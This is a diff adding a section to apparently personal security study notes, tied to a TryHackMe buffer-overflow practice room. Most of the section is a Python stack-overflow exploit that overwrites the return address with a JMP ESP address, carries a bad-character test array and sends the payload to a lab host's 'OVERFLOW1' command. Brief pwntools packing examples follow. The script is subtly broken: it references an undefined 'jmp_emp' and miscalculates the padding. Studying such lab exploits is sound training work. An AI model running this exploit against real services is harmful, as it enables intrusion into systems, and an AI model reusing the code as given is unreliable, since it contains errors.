@@ -304,6 +304,82 @@ await run_parallelism(
 )	
 ```
 
+## Encoding, Packing Bytes and Strings
+https://tryhackme.com/room/bufferoverflowprep
+https://docs.python.org/3/library/struct.html
+https://docs.pwntools.com/en/stable/
+
+There is alot here:
+```python
+#!/usr/bin/python3
+import socket
+import struct
+
+def customp32(data):
+#struct.pack(">I", data) # big endian
+#struct.pack("<I", data) # little endian
+    return struct.pack("<I", data)
+
+host, port = "10.10.61.109", 1337
+
+all_chars = bytearray(range(1,256))
+# instead of:
+#for x in range(1, 256):
+#  print("\\x" + "{:02x}".format(x), end='')
+#print()
+
+bad_chars = [
+        b"\x07",
+        b"\x2d",
+        b"\x2e",
+        b"\xa0",
+        ]
+# Add bad char to bad_chars as we discover them
+for bad_char in bad_chars:
+    all_chars = all_chars.replace(bad_char, b"")
+
+cmd = b"OVERFLOW1 "
+pattern_length = 2000 # Documentation and keep for length retention
+offset = 1978
+new_eip = b"BBBB"
+jmp_esp = customp32(0x625011AF) # must be the correct endianness
+
+payload = b"".join([
+            cmd,
+            b"A" * offset,
+            jmp_emp, # replaced new_eip
+            all_chars,
+            b"C" *  (pattern_length - len(new_eip) - offset - len(all_chars)),
+        ])
+
+with socket.socket() as s:
+    s.connect((host,port))
+    s.send(payload)
+
+```
+
+Pwntool Packing
+```python
+>>> p8(0)
+b'\x00'
+>>> p32(0xdeadbeef)
+b'\xef\xbe\xad\xde'
+>>> p32(0xdeadbeef, endian='big')
+b'\xde\xad\xbe\xef'
+>>> with context.local(endian='big'): p32(0xdeadbeef)
+b'\xde\xad\xbe\xef'
+
+Make a frozen packer, which does not change with context.
+
+>>> p=make_packer('all')
+>>> p(0xff)
+b'\xff'
+>>> p(0x1ff)
+b'\xff\x01'
+>>> with context.local(endian='big'): print(repr(p(0x1ff)))
+b'\xff\x01'
+
+```
 
 # Appendix
 
